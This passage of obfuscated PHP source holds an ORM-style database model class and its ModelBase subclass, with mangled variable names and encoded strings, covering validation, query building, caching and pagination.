Session::get($Ø»¼¹ıÉ)) { return !1; } list($›ÉµŒƒ‰, $‹ õìÓŒ) = explode($Í÷«„şÈ[11], $Ÿ—±áä[$Ø»¼¹ıÉ]); if ($‹ õìÓŒ && Session::get($Ø»¼¹ıÉ . $Í÷«„şÈ[10] . $›ÉµŒƒ‰) === $‹ õìÓŒ) { Session::remove($Ø»¼¹ıÉ . $Í÷«„şÈ[10] . $›ÉµŒƒ‰); return !0; } if (think_config($Í÷«„şÈ[297])) { Session::remove($Ø»¼¹ıÉ . $Í÷«„şÈ[10] . $›ÉµŒƒ‰); } return !1; } return !0; } public function regex($´¡€ä¾, $•š¸ÍİŒ) { $×ì„£üÏ =& $_SERVER[ì…™Î¶Ï]; $ ÀœÄ¢° = array($×ì„£üÏ[298] => $×ì„£üÏ[299], $×ì„£üÏ[300] => $×ì„£üÏ[301], $×ì„£üÏ[302] => $×ì„£üÏ[303], $×ì„£üÏ[304] => $×ì„£üÏ[305], $×ì„£üÏ[306] => $×ì„£üÏ[307], $×ì„£üÏ[308] => $×ì„£üÏ[309], $×ì„£üÏ[310] => $×ì„£üÏ[311], $×ì„£üÏ[285] => $×ì„£üÏ[312], $×ì„£üÏ[313] => $×ì„£üÏ[314]); if (isset($ ÀœÄ¢°[strtolower($•š¸ÍİŒ)])) { $•š¸ÍİŒ = $ ÀœÄ¢°[strtolower($•š¸ÍİŒ)]; } return preg_match($•š¸ÍİŒ, $´¡€ä¾) === 1; } private function autoOperation(&$şĞı‘ñ‰, $•›®¼é©) { $„ÙÀ¹šú =& $_SERVER[ì…™Î¶Ï]; if (!empty($this->options[$„ÙÀ¹šú[315]])) { $Ö¿ú¨› = $this->options[$„ÙÀ¹šú[315]]; unset($this->options[$„ÙÀ¹šú[315]]); } elseif (!empty($this->_auto)) { $Ö¿ú¨› = $this->_auto; } if (isset($Ö¿ú¨›)) { foreach ($Ö¿ú¨› as $í…‰ôºö) { if (empty($í…‰ôºö[2])) { $í…‰ôºö[2] = THINK_MODEL_INSERT; } if ($•›®¼é© == $í…‰ôºö[2] || $í…‰ôºö[2] == THINK_MODEL_BOTH) { switch (trim($í…‰ôºö[3])) { case $„ÙÀ¹šú[316]: case $„ÙÀ¹šú[317]: $î‡Ôê = isset($í…‰ôºö[4]) ? (array) $í…‰ôºö[4] : array(); if (isset($şĞı‘ñ‰[$í…‰ôºö[0]])) { array_unshift($î‡Ôê, $şĞı‘ñ‰[$í…‰ôºö[0]]); } if ($„ÙÀ¹šú[316] == $í…‰ôºö[3]) { $şĞı‘ñ‰[$í…‰ôºö[0]] = call_user_func_array($í…‰ôºö[1], $î‡Ôê); } else { $şĞı‘ñ‰[$í…‰ôºö[0]] = call_user_func_array(array(&$this, $í…‰ôºö[1]), $î‡Ôê); } break; case $„ÙÀ¹šú[268]: $şĞı‘ñ‰[$í…‰ôºö[0]] = $şĞı‘ñ‰[$í…‰ôºö[1]]; break; case $„ÙÀ¹šú[318]: if ($„ÙÀ¹šú[12] === $şĞı‘ñ‰[$í…‰ôºö[0]]) { unset($şĞı‘ñ‰[$í…‰ôºö[0]]); } break; case $„ÙÀ¹šú[319]: default: $şĞı‘ñ‰[$í…‰ôºö[0]] = $í…‰ôºö[1]; } if (!1 === $şĞı‘ñ‰[$í…‰ôºö[0]]) { unset($şĞı‘ñ‰[$í…‰ôºö[0]]); } } } } return $şĞı‘ñ‰; } protected function autoValidation($ª¾¬‡Úî, $²ÍÔ³ª) { $¢Ö§ÛØ° =& $_SERVER[ì…™Î¶Ï]; if (!empty($this->options[$¢Ö§ÛØ°[320]])) { $ƒäæ‰õ = $this->options[$¢Ö§ÛØ°[320]]; unset($this->options[$¢Ö§ÛØ°[320]]); } elseif (!empty($this->_validate)) { $ƒäæ‰õ = $this->_validate; } if (isset($ƒäæ‰õ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ƒäæ‰õ as $²ä©ÛôÍ => $†¤û½ë) { if (empty($†¤û½ë[5]) || $†¤û½ë[5] == THINK_MODEL_BOTH || $†¤û½ë[5] == $²ÍÔ³ª) { if (0 == strpos($†¤û½ë[2], $¢Ö§ÛØ°[321]) && strpos($†¤û½ë[2], $¢Ö§ÛØ°[322])) { $†¤û½ë[2] = think_lang(substr($†¤û½ë[2], 2, -1)); } $†¤û½ë[3] = isset($†¤û½ë[3]) ? $†¤û½ë[3] : THINK_EXISTS_VALIDATE; $†¤û½ë[4] = isset($†¤û½ë[4]) ? $†¤û½ë[4] : $¢Ö§ÛØ°[323]; switch ($†¤û½ë[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ª¾¬‡Úî, $†¤û½ë)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¢Ö§ÛØ°[12] != trim($ª¾¬‡Úî[$†¤û½ë[0]])) { if (!1 === $this->_validationField($ª¾¬‡Úî, $†¤û½ë)) { return !1; } } break; default: if (isset($ª¾¬‡Úî[$†¤û½ë[0]])) { if (!1 === $this->_validationField($ª¾¬‡Úî, $†¤û½ë)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Õš›Ä ‚, $™àáä¢²) { if (!1 === $this->_validationFieldItem($Õš›Ä ‚, $™àáä¢²)) { if ($this->patchValidate) { $this->error[$™àáä¢²[0]] = $™àáä¢²[2]; } else { $this->error = $™àáä¢²[2]; return !1; } } return; } protected function _validationFieldItem($àËÇæÏ, $œ„Ù¹‘) { $ù‚ÏÇ®¥ =& $_SERVER[ì…™Î¶Ï]; switch (strtolower(trim($œ„Ù¹‘[4]))) { case $ù‚ÏÇ®¥[316]: case $ù‚ÏÇ®¥[317]: $øÂïúøú = isset($œ„Ù¹‘[6]) ? (array) $œ„Ù¹‘[6] : array(); if (is_string($œ„Ù¹‘[0]) && strpos($œ„Ù¹‘[0], $ù‚ÏÇ®¥[50])) { $œ„Ù¹‘[0] = explode($ù‚ÏÇ®¥[50], $œ„Ù¹‘[0]); } if (is_array($œ„Ù¹‘[0])) { foreach ($œ„Ù¹‘[0] as $¾Ëš‚áÛ) { $ªƒÛ ïĞ[$¾Ëš‚áÛ] = $àËÇæÏ[$¾Ëš‚áÛ]; } array_unshift($øÂïúøú, $ªƒÛ ïĞ); } else { array_unshift($øÂïúøú, $àËÇæÏ[$œ„Ù¹‘[0]]); } if ($ù‚ÏÇ®¥[316] == $œ„Ù¹‘[4]) { return call_user_func_array($œ„Ù¹‘[1], $øÂïúøú); } else { return call_user_func_array(array(&$this, $œ„Ù¹‘[1]), $øÂïúøú); } case $ù‚ÏÇ®¥[324]: return $àËÇæÏ[$œ„Ù¹‘[0]] == $àËÇæÏ[$œ„Ù¹‘[1]]; case $ù‚ÏÇ®¥[325]: if (is_string($œ„Ù¹‘[0]) && strpos($œ„Ù¹‘[0], $ù‚ÏÇ®¥[50])) { $œ„Ù¹‘[0] = explode($ù‚ÏÇ®¥[50], $œ„Ù¹‘[0]); } $¼Ôáµõ = array(); if (is_array($œ„Ù¹‘[0])) { foreach ($œ„Ù¹‘[0] as $¾Ëš‚áÛ) { $¼Ôáµõ[$¾Ëš‚áÛ] = $àËÇæÏ[$¾Ëš‚áÛ]; } } else { $¼Ôáµõ[$œ„Ù¹‘[0]] = $àËÇæÏ[$œ„Ù¹‘[0]]; } if (!empty($àËÇæÏ[$this->getPk()])) { $¼Ôáµõ[$this->getPk()] = array($ù‚ÏÇ®¥[326], $àËÇæÏ[$this->getPk()]); } if ($this->where($¼Ôáµõ)->find()) { return !1; } return !0; default: return $this->check($àËÇæÏ[$œ„Ù¹‘[0]], $œ„Ù¹‘[1], $œ„Ù¹‘[4]); } } public function check($ş’«‘ƒÒ, $• Ï¦²•, $º”ë´ÖÔ = "\x72\145\x67\145\x78") { $®¢Š¦„õ =& $_SERVER[ì…™Î¶Ï]; $º”ë´ÖÔ = strtolower(trim($º”ë´ÖÔ)); switch ($º”ë´ÖÔ) { case $®¢Š¦„õ[7]: case $®¢Š¦„õ[327]: $éÅ¡™ÁÆ = is_array($• Ï¦²•) ? $• Ï¦²• : explode($®¢Š¦„õ[50], $• Ï¦²•); return $º”ë´ÖÔ == $®¢Š¦„õ[7] ? in_array($ş’«‘ƒÒ, $éÅ¡™ÁÆ) : !in_array($ş’«‘ƒÒ, $éÅ¡™ÁÆ); case $®¢Š¦„õ[328]: case $®¢Š¦„õ[329]: if (is_array($• Ï¦²•)) { $Ë›ˆ¤ëÍ = $• Ï¦²•[0]; $„ŒÇ¸Êû = $• Ï¦²•[1]; } else { list($Ë›ˆ¤ëÍ, $„ŒÇ¸Êû) = explode($®¢Š¦„õ[50], $• Ï¦²•); } return $º”ë´ÖÔ == $®¢Š¦„õ[328] ? $ş’«‘ƒÒ >= $Ë›ˆ¤ëÍ && $ş’«‘ƒÒ <= $„ŒÇ¸Êû : $ş’«‘ƒÒ < $Ë›ˆ¤ëÍ || $ş’«‘ƒÒ > $„ŒÇ¸Êû; case $®¢Š¦„õ[330]: case $®¢Š¦„õ[331]: return $º”ë´ÖÔ == $®¢Š¦„õ[330] ? $ş’«‘ƒÒ == $• Ï¦²• : $ş’«‘ƒÒ != $• Ï¦²•; case $®¢Š¦„õ[332]: $û¬ñêŸ‹ = mb_strlen($ş’«‘ƒÒ, $®¢Š¦„õ[333]); if (strpos($• Ï¦²•, $®¢Š¦„õ[50])) { list($Ë›ˆ¤ëÍ, $„ŒÇ¸Êû) = explode($®¢Š¦„õ[50], $• Ï¦²•); return $û¬ñêŸ‹ >= $Ë›ˆ¤ëÍ && $û¬ñêŸ‹ <= $„ŒÇ¸Êû; } else { return $û¬ñêŸ‹ == $• Ï¦²•; } case $®¢Š¦„õ[334]: list($íÒ¿ìÙù, $›ÂšúÇì) = explode($®¢Š¦„õ[50], $• Ï¦²•); if (!is_numeric($íÒ¿ìÙù)) { $íÒ¿ìÙù = strtotime($íÒ¿ìÙù); } if (!is_numeric($›ÂšúÇì)) { $›ÂšúÇì = strtotime($›ÂšúÇì); } return NOW_TIME >= $íÒ¿ìÙù && NOW_TIME <= $›ÂšúÇì; case $®¢Š¦„õ[335]: return in_array(get_client_ip(), explode($®¢Š¦„õ[50], $• Ï¦²•)); case $®¢Š¦„õ[336]: return !in_array(get_client_ip(), explode($®¢Š¦„õ[50], $• Ï¦²•)); case $®¢Š¦„õ[323]: default: return $this->regex($ş’«‘ƒÒ, $• Ï¦²•); } } public function query($ˆà¯ÄÂŞ, $‰ùã“±£ = false) { $Â‹Çãšú =& $_SERVER[ì…™Î¶Ï]; if (!is_bool($‰ùã“±£) && !is_array($‰ùã“±£)) { $‰ùã“±£ = func_get_args(); array_shift($‰ùã“±£); } $ˆà¯ÄÂŞ = str_replace(array($Â‹Çãšú[226], $Â‹Çãšú[337]), $Â‹Çãšú[53], $ˆà¯ÄÂŞ); $ˆà¯ÄÂŞ = $this->parseSql($ˆà¯ÄÂŞ, $‰ùã“±£); return $this->db->query($ˆà¯ÄÂŞ); } public function execute($ãõÉå¾·, $»ì¯µ´• = false) { if (!is_bool($»ì¯µ´•) && !is_array($»ì¯µ´•)) { $»ì¯µ´• = func_get_args(); array_shift($»ì¯µ´•); } $ãõÉå¾· = $this->parseSql($ãõÉå¾·, $»ì¯µ´•); return $this->db->execute($ãõÉå¾·); } protected function parseSql($Ëïœ­ò˜, $êÅìÏĞî) { $è£ïÅ®Š =& $_SERVER[ì…™Î¶Ï]; if (!0 === $êÅìÏĞî) { $ßù„‚Ê” = $this->_parseOptions(); $Ëïœ­ò˜ = $this->db->parseSql($Ëïœ­ò˜, $ßù„‚Ê”); } elseif (is_array($êÅìÏĞî)) { $êÅìÏĞî = array_map(array($this->db, $è£ïÅ®Š[338]), $êÅìÏĞî); $Ëïœ­ò˜ = vsprintf($Ëïœ­ò˜, $êÅìÏĞî); } else { $Ëïœ­ò˜ = strtr($Ëïœ­ò˜, array($è£ïÅ®Š[339] => $this->getTableName(), $è£ïÅ®Š[340] => think_config($è£ïÅ®Š[239]))); } $this->db->setModel($this->name); return $Ëïœ­ò˜; } public function db($³„…¨´‚ = '', $éâŸ‹ĞÁ = '', $ó¢””êò = array()) { $Ûàş÷Í =& $_SERVER[ì…™Î¶Ï]; if ($Ûàş÷Í[12] === $³„…¨´‚ && $this->db) { return $this->db; } static $ÎàË¹ƒ = array(); static $ÉÜéø¸ã = array(); if (!isset($ÉÜéø¸ã[$³„…¨´‚]) || isset($ÉÜéø¸ã[$³„…¨´‚]) && $éâŸ‹ĞÁ && $ÎàË¹ƒ[$³„…¨´‚] != $éâŸ‹ĞÁ) { if (!empty($éâŸ‹ĞÁ) && is_string($éâŸ‹ĞÁ) && !1 === strpos($éâŸ‹ĞÁ, $Ûàş÷Í[8])) { $éâŸ‹ĞÁ = think_config($éâŸ‹ĞÁ); } $³„…¨´‚ = think_guid($éâŸ‹ĞÁ); $ÉÜéø¸ã[$³„…¨´‚] = Db::getInstance($éâŸ‹ĞÁ); } elseif (NULL === $éâŸ‹ĞÁ) { $ÉÜéø¸ã[$³„…¨´‚]->close(); unset($ÉÜéø¸ã[$³„…¨´‚]); return; } if (!empty($ó¢””êò)) { if (is_string($ó¢””êò)) { parse_str($ó¢””êò, $ó¢””êò); } foreach ($ó¢””êò as $Ğ¾õû¥˜ => $ØÊÚ›””) { $this->setProperty($Ğ¾õû¥˜, $ØÊÚ›””); } } $ÎàË¹ƒ[$³„…¨´‚] = $éâŸ‹ĞÁ; $this->db = $ÉÜéø¸ã[$³„…¨´‚]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÉˆŠ•¼ü = get_class($this); if ($ÉˆŠ•¼ü == $_SERVER[ì…™Î¶Ï][341]) { return $this->name; } $this->name = substr($ÉˆŠ•¼ü, 0, -5); } return $this->name; } public function getTableName() { $ —¿ö² =& $_SERVER[ì…™Î¶Ï]; if (empty($this->trueTableName)) { $˜íİÇ·« = !empty($this->tablePrefix) ? $this->tablePrefix : $ —¿ö²[12]; if (!empty($this->tableName)) { $˜íİÇ·« .= $this->tableName; } else { $˜íİÇ·« .= think_parse_name($this->name); } $this->trueTableName = strtolower($˜íİÇ·«); } return (!empty($this->dbName) ? $this->dbName . $ —¿ö²[10] : $ —¿ö²[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ü—¹ıùÔ =& $_SERVER[ì…™Î¶Ï]; return isset($this->fields[$Ü—¹ıùÔ[246]]) ? $this->fields[$Ü—¹ıùÔ[246]] : $this->pk; } public function getDbFields() { $¾ ’Å =& $_SERVER[ì…™Î¶Ï]; if (isset($this->options[$¾ ’Å[274]])) { $‚Àñ¯ = $this->db->getFields($this->options[$¾ ’Å[274]]); return $‚Àñ¯ ? array_keys($‚Àñ¯) : !1; } if ($this->fields) { $‚Àñ¯ = $this->fields; unset($‚Àñ¯[$¾ ’Å[245]], $‚Àñ¯[$¾ ’Å[246]], $‚Àñ¯[$¾ ’Å[247]], $‚Àñ¯[$¾ ’Å[244]]); return $‚Àñ¯; } return !1; } public function data($ÇçÄï = '') { $ã—Ù™’ì =& $_SERVER[ì…™Î¶Ï]; if ($ã—Ù™’ì[12] === $ÇçÄï && !empty($this->data)) { return $this->data; } if (is_object($ÇçÄï)) { $ÇçÄï = get_object_vars($ÇçÄï); } elseif (is_string($ÇçÄï)) { parse_str($ÇçÄï, $ÇçÄï); } elseif (!is_array($ÇçÄï)) { think_exception(think_lang($ã—Ù™’ì[266])); } $this->data = $ÇçÄï; return $this; } public function join($ıç×ÍÙ®) { $ü¾²ÚØ± =& $_SERVER[ì…™Î¶Ï]; if (is_array($ıç×ÍÙ®)) { $this->options[$ü¾²ÚØ±[277]] = $ıç×ÍÙ®; } elseif (!empty($ıç×ÍÙ®)) { $this->options[$ü¾²ÚØ±[277]][] = $ıç×ÍÙ®; } return $this; } public function union($ª»º÷ö, $ÖÈ¶ıÃå = false) { $şğ¬Ç»ñ =& $_SERVER[ì…™Î¶Ï]; if (empty($ª»º÷ö)) { return $this; } if ($ÖÈ¶ıÃå) { $this->options[$şğ¬Ç»ñ[342]][$şğ¬Ç»ñ[343]] = !0; } if (is_object($ª»º÷ö)) { $ª»º÷ö = get_object_vars($ª»º÷ö); } if (is_string($ª»º÷ö)) { $ãÙ¨Ü©¦ = $ª»º÷ö; } elseif (is_array($ª»º÷ö)) { if (isset($ª»º÷ö[0])) { $this->options[$şğ¬Ç»ñ[342]] = array_merge($this->options[$şğ¬Ç»ñ[342]], $ª»º÷ö); return $this; } else { $ãÙ¨Ü©¦ = $ª»º÷ö; } } else { think_exception(think_lang($şğ¬Ç»ñ[266])); } $this->options[$şğ¬Ç»ñ[342]][] = $ãÙ¨Ü©¦; return $this; } public function cache($™Œ“õÏÒ = true, $¥¥ŸÃ‹Œ = null, $ºÉË—İ† = '') { $ü–Üãí =& $_SERVER[ì…™Î¶Ï]; if (!1 !== $™Œ“õÏÒ) { $this->options[$ü–Üãí[344]] = array($ü–Üãí[95] => $™Œ“õÏÒ, $ü–Üãí[334] => $¥¥ŸÃ‹Œ, $ü–Üãí[33] => $ºÉË—İ†); } return $this; } public function field($­Ş³ã˜ü, $ÌåšÙÇ = false) { $ŒÏ„ Û¢ =& $_SERVER[ì…™Î¶Ï]; if (!0 === $­Ş³ã˜ü) { $ÅºÕ¼¢ê = $this->getDbFields(); $­Ş³ã˜ü = $ÅºÕ¼¢ê ? $ÅºÕ¼¢ê : $ŒÏ„ Û¢[181]; } elseif ($ÌåšÙÇ) { if (is_string($­Ş³ã˜ü)) { $­Ş³ã˜ü = explode($ŒÏ„ Û¢[50], $­Ş³ã˜ü); } $ÅºÕ¼¢ê = $this->getDbFields(); $­Ş³ã˜ü = $ÅºÕ¼¢ê ? array_diff($ÅºÕ¼¢ê, $­Ş³ã˜ü) : $­Ş³ã˜ü; } $this->options[$ŒÏ„ Û¢[268]] = $­Ş³ã˜ü; return $this; } public function scope($¹µ¢öĞô = '', $ÑŞş½éó = NULL) { $úÌ¯‡é· =& $_SERVER[ì…™Î¶Ï]; if ($úÌ¯‡é·[12] === $¹µ¢öĞô) { if (isset($this->_scope[$úÌ¯‡é·[37]])) { $«Ù¶ö¸² = $this->_scope[$úÌ¯‡é·[37]]; } else { return $this; } } elseif (is_string($¹µ¢öĞô)) { $âàÂÑ¿“ = explode($úÌ¯‡é·[50], $¹µ¢öĞô); $«Ù¶ö¸² = array(); foreach ($âàÂÑ¿“ as $³Ö… Ñİ) { if (!isset($this->_scope[$³Ö… Ñİ])) { continue; } $«Ù¶ö¸² = array_merge($«Ù¶ö¸², $this->_scope[$³Ö… Ñİ]); } if (!empty($ÑŞş½éó) && is_array($ÑŞş½éó)) { $«Ù¶ö¸² = array_merge($«Ù¶ö¸², $ÑŞş½éó); } } elseif (is_array($¹µ¢öĞô)) { $«Ù¶ö¸² = $¹µ¢öĞô; } if (is_array($«Ù¶ö¸²) && !empty($«Ù¶ö¸²)) { $this->options = array_merge($this->options, array_change_key_case($«Ù¶ö¸²)); } return $this; } public function where($î‰­Ü°¦, $ê·åä´… = null) { $Ìƒè…æ =& $_SERVER[ì…™Î¶Ï]; if (!is_null($ê·åä´…) && is_string($î‰­Ü°¦)) { if (!is_array($ê·åä´…)) { $ê·åä´… = func_get_args(); array_shift($ê·åä´…); } $ê·åä´… = array_map(array($this->db, $Ìƒè…æ[338]), $ê·åä´…); $î‰­Ü°¦ = vsprintf($î‰­Ü°¦, $ê·åä´…); } elseif (is_object($î‰­Ü°¦)) { $î‰­Ü°¦ = get_object_vars($î‰­Ü°¦); } elseif (is_array($î‰­Ü°¦)) { foreach ($î‰­Ü°¦ as $¬¦¿úçÕ => $³“ÜĞì) { if ((is_numeric($¬¦¿úçÕ) || !$¬¦¿úçÕ) && is_string($³“ÜĞì)) { if (strpos($³“ÜĞì, $Ìƒè…æ[345]) === 0) { continue; } think_trace($Ìƒè…æ[346], $Ìƒè…æ[12], $Ìƒè…æ[49]); die; } } } if (is_string($î‰­Ü°¦) && $Ìƒè…æ[12] != $î‰­Ü°¦) { $Ÿ©Š¿ñš = array(); $Ÿ©Š¿ñš[$Ìƒè…æ[347]] = $î‰­Ü°¦; $î‰­Ü°¦ = $Ÿ©Š¿ñš; } if (isset($this->options[$Ìƒè…æ[270]])) { $this->options[$Ìƒè…æ[270]] = array_merge($this->options[$Ìƒè…æ[270]], $î‰­Ü°¦); } else { $this->options[$Ìƒè…æ[270]] = $î‰­Ü°¦; } return $this; } public function limit($¾¿çÃÙ‡, $†‘™Á°ö = null) { $ø‰•˜¸ò =& $_SERVER[ì…™Î¶Ï]; $this->options[$ø‰•˜¸ò[287]] = is_null($†‘™Á°ö) ? $¾¿çÃÙ‡ : $¾¿çÃÙ‡ . $ø‰•˜¸ò[50] . $†‘™Á°ö; return $this; } public function page($ü»¦€–µ, $Ö˜š²ú¸ = null) { $¶°¹ŞµÙ =& $_SERVER[ì…™Î¶Ï]; $this->options[$¶°¹ŞµÙ[348]] = is_null($Ö˜š²ú¸) ? $ü»¦€–µ : $ü»¦€–µ . $¶°¹ŞµÙ[50] . $Ö˜š²ú¸; return $this; } public function comment($¹ã£ä‹§) { $this->options[$_SERVER[ì…™Î¶Ï][349]] = $¹ã£ä‹§; return $this; } public function setProperty($§Áó¬Â, $Œ¯ áƒ») { if (property_exists($this, $§Áó¬Â)) { $this->{$§Áó¬Â} = $Œ¯ áƒ»; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\146\x79\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\x73\x65\x72\x74\x2c\x75\160\144\x61\x74\145", "\x66\165\x6e\x63\x74\x69\x6f\x6e"), array("\143\162\145\141\164\145\124\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\x65\162\x74", "\x66\165\156\x63\x74\151\157\156")); public function setDataAuto($­š‡ñô…) { $this->dataAuto = $­š‡ñô…; } public function __construct($ÔîÈ‚æÊ = '', $›ç™•ñ– = '', $êÄ„Ìş´ = '') { parent::__construct($ÔîÈ‚æÊ, $›ç™•ñ–, $êÄ„Ìş´); } protected $tableMeta = array(); protected function _beforeInsert(&$“¿‚Ÿ¶š, $Êô¼ãå) { $ü‹‡äƒ³ =& $_SERVER[ì…™Î¶Ï]; if (!$this->checkDataAutoHas($ü‹‡äƒ³[350])) { return; } $this->dataBeforeFilter($“¿‚Ÿ¶š, $ü‹‡äƒ³[350]); } protected function _beforeUpdate(&$öÇ¨ËÑœ, $·Ç†›‹) { $€ùøÀÂˆ =& $_SERVER[ì…™Î¶Ï]; if (!$this->checkDataAutoHas($€ùøÀÂˆ[351])) { return; } $this->dataBeforeFilter($öÇ¨ËÑœ, $€ùøÀÂˆ[351]); } protected function _afterSelect(&$œ›‰«Ø, $Ïà†ÔÓ) { if (!is_array($œ›‰«Ø)) { return; } if (!$this->checkDataAutoHas($_SERVER[ì…™Î¶Ï][352])) { return; } foreach ($œ›‰«Ø as &$ØğŠ¾Øˆ) { $this->dataAfterFilter($ØğŠ¾Øˆ); } unset($ØğŠ¾Øˆ); } protected function _afterFind(&$°Ù±ğÌô, $ÚÇ¯ô‹ä) { if (!is_array($°Ù±ğÌô)) { return; } if (!$this->checkDataAutoHas($_SERVER[ì…™Î¶Ï][352])) { return; } $this->dataAfterFilter($°Ù±ğÌô); } public static function textEncode($ÕşäÇÂ–) { if (!$ÕşäÇÂ–) { return $ÕşäÇÂ–; } $È‡öù¨ù = json_encode($ÕşäÇÂ–); $È‡öù¨ù = preg_replace_callback($_SERVER[ì…™Î¶Ï][353], function ($—¾Üñ„é) { return addslashes($—¾Üñ„é[0]); }, $È‡öù¨ù); return json_decode($È‡öù¨ù); } public static function textDecode($Äõ™ù‹Ô) { $‘Ï¸Ù„ =& $_SERVER[ì…™Î¶Ï]; $¨ğ´ìË¸ = json_encode($Äõ™ù‹Ô); $¨ğ´ìË¸ = preg_replace_callback($‘Ï¸Ù„[354], function ($ìƒÕƒŠì) { return $_SERVER[ì…™Î¶Ï][98]; }, $¨ğ´ìË¸); return json_decode($¨ğ´ìË¸); } public function setAutoIncrement($¿éÏƒ„ó) { $çñí½ = array($this->getPk() => $¿éÏƒ„ó); $…³ğğ’· = $this->data($çñí½)->add(); if ($…³ğğ’·) { $this->delete($…³ğğ’·); } } public function getAutoIncrement() { $ü­ı£«– = $this->getTableName(); $®Š¹Œ = $this->max($this->getPk()); $™Óò¹• = $this->query("\x73\150\157\x77\40\x74\141\142\154\145\x20\163\164\x61\x74\165\x73\x20\x77\x68\x65\162\145\x20\x4e\x61\155\145\x3d\47{$ü­ı£«–}\x27"); $çĞà÷ü” = $™Óò¹•[0][$_SERVER[ì…™Î¶Ï][355]]; $ğİÆ‰¡Ö = max($®Š¹Œ, $çĞà÷ü”); return $ğİÆ‰¡Ö; } protected function _callBefore($ëÇê¯¬, $˜™Å•×Ğ) { return $this->cacheCallCheck($ëÇê¯¬, $˜™Å•×Ğ, !1); } protected function _callAfter($íãù˜û­, $ğå®ğ—¬) { return $this->cacheCallCheck($íãù˜û­, $ğå®ğ—¬, !0); } protected function cacheFunctionAlias($İŠ¿äßÅ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($©âù¯Ûé, $Òà¸ïû¯, $Êù¾–·» = false) { $¸´¢Öı = $this->cacheFunctionAlias($Òà¸ïû¯); if (!$¸´¢Öı) { return; } foreach ($¸´¢Öı as $×ğôÌœ› => $¸² ëô²) { $‡Ÿ¥”× = $¸² ëô²[0]; $ï ¾•˜Ï = explode($_SERVER[ì…™Î¶Ï][50], $¸² ëô²[1]); if ($©âù¯Ûé == $×ğôÌœ›) { return $this->cacheFunctionGet($×ğôÌœ›, $‡Ÿ¥”×); } if ($Êù¾–·» && in_array($©âù¯Ûé, $ï ¾•˜Ï)) { $this->cacheFunctionClear($×ğôÌœ›, $‡Ÿ¥”×); } } } public function cacheFunctionGet($³ŸŞ‚Ìƒ, $§®ûÈîü) { $ó°±Š­Ò = $this->cacheKeyMake($³ŸŞ‚Ìƒ, $§®ûÈîü); $˜†Âƒ   = Cache::get($ó°±Š­Ò); if (!is_array($˜†Âƒ  )) { $˜†Âƒ   = call_user_func_array(array($this, $³ŸŞ‚Ìƒ), array($§®ûÈîü, !0)); Cache::set($ó°±Š­Ò, $˜†Âƒ  ); } return $˜†Âƒ  ; } public function cacheFunctionClear($àÄÀ´Â“, $˜¢²ˆúå) { $ôÃ±ÂÁ¶ = $˜¢²ˆúå; if (!is_array($˜¢²ˆúå)) { $ôÃ±ÂÁ¶ = array($˜¢²ˆúå); } foreach ($ôÃ±ÂÁ¶ as $ã«Ñ·ç‚) { $‚ÄˆÙÔå = $this->cacheKeyMake($àÄÀ´Â“, $ã«Ñ·ç‚); Cache::remove($‚ÄˆÙÔå); } } private function cacheKeyMake($ø’Óâ«œ, $¾š†Çà¯) { $Âµ¾éç˜ =& $_SERVER[ì…™Î¶Ï]; return get_class($this) . $Âµ¾éç˜[11] . $ø’Óâ«œ . $Âµ¾éç˜[356] . $¾š†Çà¯; } protected function selectPageReset() { $ô©ÃÍÌª =& $_SERVER[ì…™Î¶Ï]; if (isset($GLOBALS[$ô©ÃÍÌª[357]])) { return; } $GLOBALS[$ô©ÃÍÌª[357]] = isset($GLOBALS[$ô©ÃÍÌª[7]][$ô©ÃÍÌª[358]]) ? $GLOBALS[$ô©ÃÍÌª[7]][$ô©ÃÍÌª[358]] : !1; $GLOBALS[$ô©ÃÍÌª[359]] = isset($GLOBALS[$ô©ÃÍÌª[7]][$ô©ÃÍÌª[348]]) ? $GLOBALS[$ô©ÃÍÌª[7]][$ô©ÃÍÌª[348]] : !1; $GLOBALS[$ô©ÃÍÌª[7]][$ô©ÃÍÌª[358]] = !1; $GLOBALS[$ô©ÃÍÌª[7]][$ô©ÃÍÌª[348]] = !1; } protected function selectPageRestore() { $¼ÎÓŸ¤ =& $_SERVER[ì…™Î¶Ï]; if (!isset($GLOBALS[$¼ÎÓŸ¤[357]])) { return; } $GLOBALS[$¼ÎÓŸ¤[7]][$¼ÎÓŸ¤[358]] = $GLOBALS[$¼ÎÓŸ¤[357]]; $GLOBALS[$¼ÎÓŸ¤[7]][$¼ÎÓŸ¤[348]] = $GLOBALS[$¼ÎÓŸ¤[359]]; if ($GLOBALS[$¼ÎÓŸ¤[7]][$¼ÎÓŸ¤[358]] === !1) { unset($GLOBALS[$¼ÎÓŸ¤[7]][$¼ÎÓŸ¤[358]]); } if ($GLOBALS[$¼ÎÓŸ¤[7]][$¼ÎÓŸ¤[348]] === !1) { unset($GLOBALS[$¼ÎÓŸ¤[7]][$¼ÎÓŸ¤[348]]); } unset($GLOBALS[$¼ÎÓŸ¤[357]]); unset($GLOBALS[$¼ÎÓŸ¤[359]]); } protected function selectPage($şˆì²åŞ = 200, $ãé´³í = 1) { $×Áƒİæì =& $_SERVER[ì…™Î¶Ï]; global $in; $áîı½ñ® = $this->optionsValue(); $æÓÁº± = 50000; $şˆì²åŞ = isset($in[$×Áƒİæì[358]]) && $in[$×Áƒİæì[358]] ? $in[$×Áƒİæì[358]] : $şˆì²åŞ; if ($şˆì²åŞ === -1) { $in[$×Áƒİæì[358]] = !1; $æÓÁº± = 100000000; $şˆì²åŞ = $æÓÁº±; } $«…Ëø¢ì = $áîı½ñ®; $«…Ëø¢ì[$×Áƒİæì[360]] = array(); 